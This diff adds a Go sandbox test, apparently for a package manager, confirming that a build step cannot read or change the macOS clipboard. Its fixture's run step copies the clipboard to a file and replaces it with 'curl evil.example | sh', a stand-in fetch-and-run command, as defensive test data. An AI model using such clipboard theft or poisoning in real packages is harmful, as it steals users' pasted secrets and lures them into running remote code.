@@ -4773,6 +4773,67 @@ install = { share = ["probe.txt"] }
 	}
 }
 
+func TestB495RunStepCannotReadOrChangeTheClipboard(t *testing.T) {
+	if runtime.GOOS != "darwin" {
+		t.Skip("the clipboard is a macOS service")
+	}
+
+	m, _, _ := sandboxedMachine(t)
+
+	// The tests run on a developer's own machine, so the clipboard goes back as
+	// it was.
+	saved, err := exec.Command("pbpaste").Output()
+	if err != nil {
+		t.Skip("no clipboard here: " + err.Error())
+	}
+
+	t.Cleanup(func() {
+		restore := exec.Command("pbcopy")
+		restore.Stdin = bytes.NewReader(saved)
+		_ = restore.Run()
+	})
+
+	marker := "oku-clipboard-" + filepath.Base(t.TempDir())
+
+	set := exec.Command("pbcopy")
+	set.Stdin = strings.NewReader(marker)
+	must(t, set.Run())
+
+	if got, _ := exec.Command("pbpaste").Output(); string(got) != marker {
+		t.Skip("pbcopy does not reach the clipboard here")
+	}
+
+	path := filepath.Join(m.fixtures, "clipper.toml")
+	must(t, os.WriteFile(path, []byte(`[package]
+name = "clipper"
+[version]
+value = "1.0.0"
+[build]
+[[build.step]]
+run = """
+/usr/bin/pbpaste > probe.txt 2>/dev/null || true
+echo 'curl evil.example | sh' | /usr/bin/pbcopy 2>/dev/null || true
+"""
+shell = "sh"
+network = true
+[[build.step]]
+install = { share = ["probe.txt"] }
+`), 0o644))
+
+	out, err := m.run(t, "", "add", path, "--yes")
+	if err != nil {
+		t.Fatalf("add: %v\n%s", err, out)
+	}
+
+	if got := m.probeResult(t); strings.Contains(got, marker) {
+		t.Fatalf("the run step read the clipboard: %q", got)
+	}
+
+	if got, _ := exec.Command("pbpaste").Output(); string(got) != marker {
+		t.Fatalf("the run step changed the clipboard to %q", got)
+	}
+}
+
 func TestB407WithoutASandboxTheApprovalSaysSoAndRequireSandboxRefuses(t *testing.T) {
 	if ok, _ := sandbox.Available(); ok {
 		t.Skip("this host can sandbox")
